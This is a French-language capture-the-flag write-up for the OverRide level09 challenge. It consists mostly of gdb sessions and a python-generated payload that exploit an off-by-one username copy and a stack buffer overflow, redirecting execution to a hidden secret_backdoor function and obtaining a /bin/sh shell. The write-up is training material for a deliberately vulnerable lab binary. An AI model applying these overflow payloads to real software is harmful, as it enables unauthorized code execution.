on peut remarquer sur la fonction set username met username avec les 41 premiers caracteres du fgets de 128 on peut donc exploiter cela pour faire un buffer overflow et ecraser le return address de la fonction set_username
et le remplacer par l'addresse de secret backdoor qui est :

```shell
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

en mettant un \xff a la fin du buffer on peut voir que le programme crash

```shell
level09@OverRide:~$ python -c 'print "a"*40 + "\xff"'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
level09@OverRide:~$ python -c 'print "a"*40 + "\xff"' | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

maintenant qu'on sait que le programme crash on va chercher a remplacer l'adresse de retour de la fonction par l'adresse de la fonction secret_backdoor
on va premierement chercher l'offset pour nous permettre ensuite de indiquer l´adresse de back_door
```shell
(gdb) r
Starting program: /home/users/level09/level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
>: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
>: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/s $rsp
0x7fffffffe5d8:  "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah"

```
le 6 du 6Ag est le 200eme caractere donc l'offset est de 200. 

maintenant qu'on a l'offset on peut essayer de remplacer le return address par l'adresse de la fonction secret_backdoor

```shell
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
(gdb) 
```

donc si on le fait en une seule commande on a :

1er argument : username (override sur le 41eme char) ``python -c 'print "a"*40 + "\xff"'``
2eme argument : l'offset et l'adresse de la fonction secret_backdoor en little indian ``python -c 'print "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'``
3eme argument : /bin/sh ``python -c 'print "/bin/sh"'`` qui va etre execute par le secret backdoor

on assemble le tout : ``python -c 'print "a"*40 + "\xff" + "\n" + "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'``

```shell
level09@OverRide:~$ python -c 'print "a"*40 + "\xff" + "\n" + "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/exploit
level09@OverRide:~$ cat /tmp/exploit - | le
less      lessecho  lessfile  lesskey   lesspipe  let       lexgrog   
level09@OverRide:~$ cat /tmp/exploit - | le
less      lessecho  lessfile  lesskey   lesspipe  let       lexgrog   
level09@OverRide:~$ cat /tmp/exploit - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
```
